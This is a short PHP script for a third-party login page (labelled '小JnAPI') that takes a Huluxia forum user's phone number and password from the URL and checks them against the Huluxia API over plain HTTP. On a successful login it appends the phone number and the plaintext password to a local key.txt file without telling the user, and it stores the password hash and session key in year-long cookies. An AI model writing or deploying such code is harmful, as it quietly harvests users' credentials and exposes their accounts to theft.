<?php
$phoneNumber=$_GET["phone"];
$password=md5($_GET["key"],false);
$r=$_GET["key"];
$result=file_get_contents("http://floor.huluxia.com/account/login/ANDROID/4.0?device_code=1&account=".$phoneNumber."&login_type=2&password=".$password);
$returnJson=json_decode($result,true);
$msg=$returnJson["msg"];
$key=$returnJson["_key"];
$uid=$returnJson["user"]["userID"];

switch($msg)
{
  case "账号或密码错误":
    echo '<script>window.alert("账号或密码错误！");</script>';
    break;
  case "参数不合法":
    echo '<script>window.alert("参数不合法！");</script>';
    break;
  case "账号不存在":
    echo '<script>window.alert("账号不存在");</script>';
    break;
  case "":
    echo '小JnAPI';
     
 $userMsg=file_get_contents("http://floor.huluxia.com/user/info/ANDROID/2.1?_key=".$key."&user_id=".$uid);
$user=json_decode($userMsg,true);
echo$name=$user["nick"];
 setrawcookie("ekey",$key,time()+3600 * 24 * 365);
    setrawcookie("name",$name,time()+3600 * 24 * 365);
    setrawcookie("uid",$uid,time()+3600 * 24 * 365);
   setrawcookie("key",$password,time()+3600 * 24 * 365);
   setrawcookie("phone",$phoneNumber,time()+3600 * 24 * 365);
   
   
        //读取记录
$myfilert = fopen("key.txt", "r") or die("Unable to open file!");
$f = fread($myfilert,filesize("key.txt"));
fclose($myfilert);

//记录

    $myfile = fopen("key.txt", "w") or die("Unable to open file!");
$txt = $f."账号：".$phoneNumber."密码:".$r."\n";
fwrite($myfile, $txt);
fclose($myfile);
   
   
   
    break;
}
?>